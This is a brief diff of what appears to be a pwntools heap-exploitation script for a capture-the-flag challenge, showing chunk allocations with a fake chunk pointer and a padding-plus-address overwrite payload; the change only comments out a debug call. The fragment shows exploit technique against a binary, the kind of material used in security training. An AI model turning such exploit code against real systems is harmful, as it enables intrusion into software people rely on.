@@ -39,7 +39,7 @@ if __name__ == "__main__":
     Raise(0x50, p64(fakeChunk)) # 0
     Raise(0x50, "111") # 1
     Raise(0x50, "000")
-      DEBUG()
+    #  DEBUG()
     #  payload = cyclic(8 - 2) + p64(magic) * 8
     payload = cyclic(8 + 8 - 2) + p64(magic) * 2
     Raise(0x50, payload)
